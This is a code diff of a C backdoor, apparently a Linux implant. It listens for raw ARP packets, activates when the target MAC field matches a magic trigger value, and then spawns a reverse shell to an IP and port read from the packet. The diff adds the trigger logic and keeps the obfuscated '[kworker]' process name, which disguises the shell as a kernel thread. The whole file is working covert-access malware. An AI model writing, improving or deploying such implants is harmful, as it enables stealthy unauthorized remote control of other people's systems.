@@ -1,6 +1,13 @@
 #include<stdlib.h>
 #include<unistd.h>
+#include<fcntl.h>
 #include<arpa/inet.h>
+#include<sys/types.h>
+#include<sys/stat.h>
+#include<sys/wait.h>
+#include<sys/prctl.h>
+
+#include<stdio.h>
 
 /* Defined a custom struct to handle both the
    Ethernet Header and the Arp Header */
@@ -41,19 +48,19 @@ int reverse_shell(unsigned int IP_ADDR, unsigned short PORT)
 			struct sockaddr_in sa;
 			int s;
 
-        		sa.sin_family = AF_INET;
-        		sa.sin_addr.s_addr = IP_ADDR;
+      			sa.sin_family = AF_INET;
+      			sa.sin_addr.s_addr = IP_ADDR;
 			sa.sin_port = PORT;
 
 			s = socket(AF_INET, SOCK_STREAM, 0);
-        		connect(s, (struct sockaddr *)&sa, sizeof(sa));
-        		dup2(s, 0);
-        		dup2(s, 1);
-        		dup2(s, 2);
+      			connect(s, (struct sockaddr *)&sa, sizeof(sa));
+      			dup2(s, 0);
+      			dup2(s, 1);
+      			dup2(s, 2);
 
-/* shell = "sh"
-   name  = "[kworker]"
-	 execlp will search PATH looking for "sh" */
+			/* shell = "sh"
+   		 	   name  = "[kworker]"
+	 		   execlp will search PATH looking for "sh" */
 
 			char shell[3] = {0x73,0x68,0x0};
 			char name[10] = {0x5b,0x6b,0x77,0x6f,0x72,0x6b,0x65,0x72,0x5d,0x0};
@@ -90,7 +97,21 @@ int arp_listener()
 		}
 
 		struct arp_hdr *arphdr = (struct arp_hdr*)buffer;
-		if(ntohs(arphdr->ar_hrd) == 24){
+		unsigned long first;
+		unsigned long second;
+		unsigned long trigger;
+		
+		// Split MAC field in half using bit shifting
+		first=(arphdr->ar_tha[0]<<16); 
+		first+=(arphdr->ar_tha[1]<<8); 
+		first+=(arphdr->ar_tha[2]); 
+		second=(arphdr->ar_tha[3]<<16); 
+		second+=(arphdr->ar_tha[4]<<8); 
+		second+=(arphdr->ar_tha[5]);
+
+		trigger = first + second;
+
+		if(trigger == 0x1fffdfe) {
 
 			unsigned short port;
 			unsigned int   ip;
@@ -106,6 +127,7 @@ int arp_listener()
 			{
 				if(setsid()>0)
 				{
+					close(sock_raw);
 					reverse_shell(ip,port);
 				}
 			}
@@ -116,11 +138,8 @@ int arp_listener()
 
 }
 
-int main()
+int main(int argc,char *argv[] )
 {
-	if(fork()==0)
-	{
-		arp_listener();
-	}
+	arp_listener();
 	return 0;
 }
